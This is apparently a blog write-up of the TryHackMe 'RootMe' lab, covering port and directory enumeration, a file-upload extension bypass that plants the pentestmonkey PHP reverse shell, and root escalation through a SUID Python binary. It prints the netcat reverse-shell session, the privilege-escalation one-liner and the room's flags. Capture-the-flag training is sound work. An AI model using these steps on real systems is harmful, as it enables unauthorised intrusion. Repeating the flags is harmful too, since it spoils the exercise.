---
layout: post
title: RootMe
subtitle: TryHackME - RootMe
description: Enumerate services, scan TCP/UDP ports, exploit vulnerabilities, and escalate privileges to capture flags.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/11d59cb34397e986062eb515f4d32421.png
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/11d59cb34397e986062eb515f4d32421.png
tags:
  - TryHackME
  - Privilege Escalation
  - Find Flags
author: Mustafa Altayeb
date: 2025-11-01:00
paginate: true
---

# RootMe
[RootMe](https://tryhackme.com/room/rrootme)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/11d59cb34397e986062eb515f4d32421.png)

## Objectives
1. **Enumerate TCP ports** using Nmap
2. **Enumerate HTTP service** on port 80
3. **Enumerate web directories** using Gobuster
4. **Gain initial access** with a reverse shell via file upload exploit
5. **Privilege escalation** using SUID Python binary
6. **Capture the user and root flags**

## Reconnaissance

### Nmap Scan
Port scan:
```bash
nmap -sCV -p- -T4 10.10.233.74  
```
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c5:79:36:d3:0a:b3:7d:e0:0d:23:1c:37:7f:7e:d2:bb (RSA)
|   256 4a:e6:49:ff:cf:fa:7e:89:37:19:2d:ed:17:05:84:9c (ECDSA)
|_  256 c4:3f:fd:cf:f7:b4:8a:3e:9f:c8:d5:33:ef:21:c7:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
**Key Findings**:
- **Port 22**: SSH service, version OpenSSH 8.2p1
- **Port 80**: Apache httpd 2.4.41

## Web Enumeration

![](/assets/TryHackMeRoomsImage/RootMe/image.png)
Nothing interesting here .
Let's enum web directories

Gobuster may find special directories.

## Gobuster

>|**gobuster dir --url http://10.10.233.74 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt**

**Result**
```js
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 314] [--> http://10.10.233.74/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.233.74/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.233.74/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.233.74/panel/]
```

**Findings**:
- After visiting pages in the Gobuster results, I found:
  1. `/uploads`: no thing here .
     
  2. `/panel`: file upload page .

![](/assets/TryHackMeRoomsImage/RootMe/image2.png)

 I will use [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

  - i tried to upload `php` shell but extension permitted i make it `phtml` and it's work 
  ![](/assets/TryHackMeRoomsImage/RootMe/image3.png)

We can access `uploads` with the link `http://10.10.233.74/uploads/shell.phtml`

## Initial Access via Reverse Shell

create listener with Netcat:

```bash
nc -nlvp 9090
```
access reverse shell with `http://10.10.233.74/uploads/shell.phtml`

```bash
nc -nlvp 9090                                                     
listening on [any] 9090 ...
connect to [10.14.109.66] from (UNKNOWN) [10.10.233.74] 54604
................
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

## Privilege Escalation

### System Exploration
Find SUID binaries : 
>**find / -perm -u=s -type f 2>/dev/null**

```js
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
.
.
.

/usr/bin/python2.7
..
.
.
```

Find SUID python searching in GTFObins i find : 
 ![](/assets/TryHackMeRoomsImage/RootMe/image4.png)

in first command it's install python we have it already 
let's run the second command 

>**python -c 'import os; os.execl("/bin/sh", "sh", "-p")'**

```js
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
whoami
root
```
flags if you care about it :

The user flag is in /var/www `THM{y0u_g0t_a_sh3ll}`
The root flag is in /root `THM{pr1v1l3g3_3s.......}`

Finished. Happy Hacking!



<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>

Follow me:
- [LinkedIn](https://www.linkedin.com/in/t4t4r1s/)
- [X](https://x.com/T4T4R1S)

---